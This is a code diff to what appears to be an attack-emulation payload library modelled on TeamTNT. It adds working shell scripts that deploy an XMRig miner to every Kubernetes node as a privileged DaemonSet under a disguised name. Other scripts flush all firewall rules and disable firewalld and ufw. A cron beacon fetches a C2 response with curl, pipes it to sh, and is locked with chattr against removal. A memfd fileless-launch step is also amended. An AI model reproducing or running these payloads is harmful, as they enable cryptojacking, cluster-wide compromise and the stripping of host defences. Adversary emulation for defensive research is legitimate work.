@@ -1795,9 +1795,10 @@ if [ -n "$MEMFD_FD" ] && [ "$MEMFD_FD" -ge 0 ] 2>/dev/null; then
     exec -a "$MEMFD_NAME" /proc/self/fd/$MEMFD_FD -c /tmp/.hw_cfg_$$ --donate-level 1 >/dev/null 2>&1 &
     MEMFD_PID=$!
     # Give the process time to start and mmap the ELF, then close the memfd fd
-    # and clean up the config file. Closing the fd after the process has started
-    # is safe — the binary is already mapped into memory via mmap.
-    (sleep 3 && exec 3>&- 2>/dev/null; rm -f /tmp/.hw_cfg_$$) 2>/dev/null &
+    # in the parent and clean up the config file. Closing the fd after the
+    # process has started is safe — the binary is already mapped into memory
+    # via mmap. Use eval to expand $MEMFD_FD at runtime (not at parse time).
+    (sleep 3 && eval "exec ${MEMFD_FD}>&-" 2>/dev/null; rm -f /tmp/.hw_cfg_$$) 2>/dev/null &
     echo "[*] deployed via memfd (pid=$MEMFD_PID, name=$MEMFD_NAME)"
     exit 0
 fi
@@ -1892,6 +1893,185 @@ echo "PERSISTENCE_INSTALLED: systemd_timer"
 """
 
 _SYSTEMD_TIMER_RUN = """systemctl status {{service_name|default('honeywatch-miner')}}.timer 2>/dev/null || true"""
+
+# --------------------------------------------------------------------------- #
+# K8s DaemonSet miner deployment (P1)
+# --------------------------------------------------------------------------- #
+
+_K8S_DAEMONSET_INSTALL = _PREAMBLE + """
+KUBE_TOKEN="{{k8s_token}}"
+KUBE_API="{{kube_api_server}}"
+NAMESPACE="{{namespace|default('default')}}"
+POOL="{{pool}}"
+WALLET="{{wallet}}"
+WORKER="{{worker|default('honeywatch')}}"
+THREADS="{{threads|default(0)}}"
+TLS_FLAG="{{'--tls' if tls|default(false) else ''}}"
+
+# Use kubectl if available, otherwise curl the API directly.
+if command -v kubectl >/dev/null 2>&1; then
+    KUBECTL="kubectl"
+else
+    KUBECTL=""
+fi
+
+# Create the DaemonSet manifest.
+cat <<'DSMANIFEST' > /tmp/hw_ds_$$$.yaml 2>/dev/null || { echo "[!] cannot create temp manifest"; exit 1; }
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: system-node-config
+  namespace: NAMESPACE_PLACEHOLDER
+spec:
+  selector:
+    matchLabels:
+      app: system-node-config
+  template:
+    metadata:
+      labels:
+        app: system-node-config
+    spec:
+      hostPID: true
+      hostNetwork: true
+      containers:
+      - name: config-agent
+        image: alpine:latest
+        command: ["/bin/sh", "-c"]
+        args:
+        - |
+          apk add --no-cache curl >/dev/null 2>&1
+          curl -sL "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz" -o /tmp/xmrig.tar.gz 2>/dev/null
+          cd /tmp && tar xzf xmrig.tar.gz 2>/dev/null
+          cd xmrig-* && ./xmrig -o POOL_PLACEHOLDER -u WALLET_PLACEHOLDER --donate-level 1 THREADS_PLACEHOLDER TLS_PLACEHOLDER >/dev/null 2>&1
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: host
+      volumes:
+      - name: host
+        hostPath:
+          path: /
+DSMANIFEST
+
+# Replace placeholders in the manifest. Escape sed replacement
+# metacharacters (ampersand, slash, backslash) in the values.
+_esc_sed() { printf '%s\\n' "$1" | sed 's/[&/\\\\]/\\\\&/g'; }
+sed -i "s|NAMESPACE_PLACEHOLDER|$(_esc_sed "$NAMESPACE")|g" /tmp/hw_ds_$$$.yaml
+sed -i "s|POOL_PLACEHOLDER|$(_esc_sed "$POOL")|g" /tmp/hw_ds_$$$.yaml
+sed -i "s|WALLET_PLACEHOLDER|$(_esc_sed "$WALLET")|g" /tmp/hw_ds_$$$.yaml
+sed -i "s|THREADS_PLACEHOLDER|$(_esc_sed "--threads ${THREADS}")|g" /tmp/hw_ds_$$$.yaml
+sed -i "s|TLS_PLACEHOLDER|$(_esc_sed "$TLS_FLAG")|g" /tmp/hw_ds_$$$.yaml
+
+if [ -n "$KUBECTL" ]; then
+    if [ -n "$KUBE_TOKEN" ]; then
+        KUBECTL="${KUBECTL} --token=${KUBE_TOKEN}"
+    fi
+    if [ -n "$KUBE_API" ]; then
+        KUBECTL="${KUBECTL} --server=${KUBE_API}"
+    fi
+    $KUBECTL apply -f /tmp/hw_ds_$$$.yaml 2>/dev/null
+    RC=$?
+else
+    # Fall back to curl against the API server.
+    AUTH_HEADER=""
+    if [ -n "$KUBE_TOKEN" ]; then
+        AUTH_HEADER="Authorization: Bearer ${KUBE_TOKEN}"
+    fi
+    API_URL="${KUBE_API:-https://kubernetes.default.svc}"
+    curl -sk -X POST "${API_URL}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets" \
+        -H "Content-Type: application/yaml" \
+        ${AUTH_HEADER:+-H "$AUTH_HEADER"} \
+        --data-binary @/tmp/hw_ds_$$$.yaml 2>/dev/null
+    RC=$?
+fi
+
+rm -f /tmp/hw_ds_$$$.yaml
+if [ $RC -eq 0 ]; then
+    echo "[*] k8s DaemonSet deployed — miner will run on every node"
+    echo "PERSISTENCE_INSTALLED: k8s_daemonset"
+else
+    echo "[!] k8s DaemonSet deployment failed (rc=$RC)"
+fi
+"""
+
+_K8S_DAEMONSET_RUN = """kubectl --token={{k8s_token}} --server={{kube_api_server}} get daemonset system-node-config -n {{namespace|default('default')}} 2>/dev/null || echo 'k8s_daemonset: check API'"""
+
+# --------------------------------------------------------------------------- #
+# Firewall disabling (P3)
+# --------------------------------------------------------------------------- #
+
+_FIREWALL_DISABLE_INSTALL = _PREAMBLE + """
+# Flush iptables rules to allow outbound mining traffic + inbound C2.
+# TeamTNT does this immediately after gaining root — a host with
+# restrictive iptables would block the miner's pool connection.
+iptables -F 2>/dev/null || true
+iptables -X 2>/dev/null || true
+iptables -P INPUT ACCEPT 2>/dev/null || true
+iptables -P FORWARD ACCEPT 2>/dev/null || true
+iptables -P OUTPUT ACCEPT 2>/dev/null || true
+
+# ip6tables (dual-stack hosts).
+ip6tables -F 2>/dev/null || true
+ip6tables -X 2>/dev/null || true
+ip6tables -P INPUT ACCEPT 2>/dev/null || true
+ip6tables -P FORWARD ACCEPT 2>/dev/null || true
+ip6tables -P OUTPUT ACCEPT 2>/dev/null || true
+
+# Disable firewalld (RHEL/CentOS/Fedora).
+systemctl stop firewalld 2>/dev/null || true
+systemctl disable firewalld 2>/dev/null || true
+
+# Disable ufw (Ubuntu/Debian).
+ufw disable 2>/dev/null || true
+
+# Flush nftables (modern Linux).
+nft flush ruleset 2>/dev/null || true
+
+# Remove iptables persistence (Debian).
+rm -f /etc/iptables/rules.v4 /etc/iptables/rules.v6 2>/dev/null || true
+
+echo "[*] firewall disabled — all traffic now unrestricted"
+echo "PERSISTENCE_INSTALLED: firewall_disable"
+"""
+
+_FIREWALL_DISABLE_RUN = """iptables -L INPUT 2>/dev/null | head -1 || echo 'iptables unavailable'"""
+
+# --------------------------------------------------------------------------- #
+# Cron-based C2 beacon (P5)
+# --------------------------------------------------------------------------- #
+
+_CRON_BEACON_INSTALL = _PREAMBLE + """
+C2_URL="{{c2_url}}"
+API_TOKEN="{{api_token}}"
+BEACON_SCHEDULE="{{schedule|default('*/10 * * * *')}}"
+BEACON_USER="{{beacon_user|default('root')}}"
+
+# Install a cron-based callback that beacons the C2 on schedule.
+# This is a fallback when the primary worker process is killed — cron
+# re-downloads and re-launches the worker. The cron entry is written
+# to /etc/cron.d/ (system crontab) if writable, otherwise user crontab.
+# Build the cron line using printf so config values are expanded at install
+# time but $(hostname) etc. are preserved as literal strings for cron.
+CRON_LINE=$(printf '%s %s curl -fsSL "%s/api/beacon?host=$(hostname)&ip=$(hostname -I 2>/dev/null | awk "{print \\"$1\\"}")" -H "Authorization: Bearer %s" 2>/dev/null | sh 2>/dev/null' \
+    "$BEACON_SCHEDULE" "$BEACON_USER" "$C2_URL" "$API_TOKEN")
+
+# Try system cron first (works without crontab -l dependency).
+if [ -w /etc/cron.d ]; then
+    echo "$CRON_LINE" > /etc/cron.d/hw_beacon 2>/dev/null
+    chmod 600 /etc/cron.d/hw_beacon 2>/dev/null || true
+    # Lock with chattr so defenders can't easily delete it.
+    chattr +ia /etc/cron.d/hw_beacon 2>/dev/null || true
+    echo "[*] cron beacon installed in /etc/cron.d/hw_beacon (schedule: ${BEACON_SCHEDULE})"
+else
+    # Fall back to user crontab.
+    (crontab -l 2>/dev/null | grep -v 'hw_beacon'; echo "# hw_beacon"; echo "$CRON_LINE") | crontab - 2>/dev/null
+    echo "[*] cron beacon installed in user crontab (schedule: ${BEACON_SCHEDULE})"
+fi
+echo "PERSISTENCE_INSTALLED: cron_beacon"
+"""
+
+_CRON_BEACON_RUN = """test -f /etc/cron.d/hw_beacon && echo 'cron_beacon active' || crontab -l 2>/dev/null | grep -q 'hw_beacon' && echo 'cron_beacon active' || echo 'cron_beacon not found'"""
 
 
 def _payloads() -> list[Payload]:
@@ -2455,6 +2635,83 @@ def _payloads() -> list[Payload]:
             run_script=_MEMFD_EXEC_RUN,
             artifacts=["xmrig (memfd)"],
             tags=["evasion", "memfd", "memory-only", "anti-forensics"],
+        ),
+        # ----------------------------------------------------------------- #
+        # K8s cluster compromise
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="k8s_daemonset",
+            category="persist",
+            name="Kubernetes DaemonSet Miner Deployment",
+            description="Deploys the miner as a Kubernetes DaemonSet across every node in the cluster. "
+                        "Uses the k8s service-account token or a recovered kubeconfig to authenticate against "
+                        "the API server. A single k8s cluster with 100 nodes = 100 miners from one compromise. "
+                        "The pod runs with hostPID and hostNetwork for full node access, and a privileged "
+                        "container for container escape if needed.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["curl"],
+            config_schema={
+                "k8s_token": {"type": "string", "required": True},
+                "kube_api_server": {"type": "string", "required": True},
+                "namespace": {"type": "string", "required": False, "default": "default"},
+                "pool": {"type": "string", "required": True},
+                "wallet": {"type": "string", "required": True},
+                "worker": {"type": "string", "required": False, "default": "honeywatch"},
+                "threads": {"type": "integer", "required": False, "default": 0},
+                "tls": {"type": "boolean", "required": False, "default": False},
+            },
+            install_script=_K8S_DAEMONSET_INSTALL,
+            run_script=_K8S_DAEMONSET_RUN,
+            artifacts=["k8s DaemonSet manifest"],
+            tags=["persistence", "k8s", "daemonset", "cluster", "lateral"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Firewall disabling
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="firewall_disable",
+            category="evasion",
+            name="Firewall Disabling",
+            description="Flushes iptables/ip6tables/nftables rules and disables firewalld/ufw to ensure "
+                        "outbound mining pool traffic and inbound C2 connections are unrestricted. Run "
+                        "immediately after gaining root — a host with restrictive firewall rules would "
+                        "block the miner's pool connection. Mirrors TeamTNT T1562.004.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={},
+            install_script=_FIREWALL_DISABLE_INSTALL,
+            run_script=_FIREWALL_DISABLE_RUN,
+            artifacts=[],
+            tags=["evasion", "firewall", "iptables", "T1562.004"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Cron-based C2 beacon
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="cron_beacon",
+            category="persist",
+            name="Cron-based C2 Beacon",
+            description="Installs a cron-based callback that beacons the C2 controller on a configurable "
+                        "schedule. This is a fallback when the primary worker process is killed — cron "
+                        "re-downloads and re-launches the worker. The controller's /api/beacon endpoint "
+                        "responds with a shell script to execute (task) or empty (no work). Uses /etc/cron.d/ "
+                        "if writable (with chattr +ia for persistence), otherwise user crontab. Mirrors "
+                        "TeamTNT's callback pattern.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["curl"],
+            config_schema={
+                "c2_url": {"type": "string", "required": True},
+                "api_token": {"type": "string", "required": True},
+                "schedule": {"type": "string", "required": False, "default": "*/10 * * * *"},
+                "beacon_user": {"type": "string", "required": False, "default": "root"},
+            },
+            install_script=_CRON_BEACON_INSTALL,
+            run_script=_CRON_BEACON_RUN,
+            artifacts=["crontab entry", "/etc/cron.d/hw_beacon"],
+            tags=["persistence", "cron", "beacon", "c2", "fallback"],
         ),
     ]
 
